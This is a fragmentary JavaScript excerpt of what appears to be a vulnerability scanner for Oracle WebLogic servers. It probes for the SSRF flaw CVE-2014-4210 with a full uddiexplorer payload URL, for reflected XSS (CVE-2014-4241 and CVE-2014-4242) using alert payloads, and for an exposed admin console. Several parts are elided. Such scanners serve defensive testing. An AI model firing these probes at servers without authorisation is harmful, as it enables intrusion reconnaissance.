...
// sort ip.txt|uniq>ip2.txt;mv ip2.txt ip.txt
	doCheck:function (url,fnCbk)
	{
        var _s = this.self,_t = this, 
            ...
            p1 = "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001",
            s = szU + p1;
...
save`;
        ...
        {
            _s.error(e);
            var szRst = "weblogic.uddi.client.structures.exception.XML_SoapException";
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst))
            {
                oT.vul = true;
                oT.payload = p1;
                oT.result = szRst;
                oT["CVE-2014-4210"] = "发现高危weblogic SSRF CVE-2014-4210漏洞,可访" + s + "问进行测试";
            }
            fnCbk(oT,_t);
        });
        ...
        _s.request({method:"GET","uri":s2,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            ...
            console.log(s2);
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst = "<script>alert(2)"))
            {
                oT.vul = true;
                oT.result = szRst;
                oT.payload = p2;
                oT["CVE-2014-4241"] = "发现高危weblogic CSS(Cross Site Scripting) CVE-2014-4241漏洞,可访" + s2 + "问进行测试";
            }
            fnCbk(oT,_t);
        });
        ...
        _s.request({method:"GET","uri":s1,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            ...
            var szRst = "";
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst = "<script>alert(77)"))
            {
                oT.vul = true;
                oT.result = szRst;
                oT.payload = p3;
                oT["CVE-2014-4242"] = "发现高危weblogic CSS(Cross Site Scripting) CVE-2014-4242漏洞,可访" + s1 + "问进行测试";
            }
            fnCbk(oT,_t);
        });
        ...
        _s.request({method:"GET","uri":s9,headers:{"user-agent": _s.g_szUa}},function(e,r,b)
        {
            ...
            var szRst = "";
            if(e);
            else if(r && 200 == r.statusCode && -1 < b.indexOf(szRst = "WebLogic Server"))
            {
                oT.vul = true;
                oT.result = szRst;
                oT.payload = p3;
                oT["infoLeak"] = "发现管理控制台" + s9 + "问进行测试";
            }
            fnCbk(oT,_t);
        });
